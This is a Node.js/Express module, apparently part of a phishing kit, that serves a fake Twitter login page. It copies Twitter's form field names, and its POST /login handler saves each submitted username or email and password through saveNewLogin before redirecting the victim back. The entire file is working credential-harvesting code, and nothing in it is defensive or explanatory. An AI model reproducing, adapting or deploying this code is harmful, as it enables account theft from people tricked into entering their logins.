exports.info = {
    name: 'twitter',
    views: '/twitter/views',
    static: '/twitter/static'
};

exports.execute = function (app, schemaUtils) {
    app.get('/', async (req, res) => {
        res.render('index');
    });

    app.post('/login', async (req, res) => {
        let email = req.body.session.username_or_email;
        let pass = req.body.session.password;
        if (email && pass) {
            schemaUtils.saveNewLogin(exports.info.name, email, pass);
        }
        res.status(200).redirect('/');
    })
};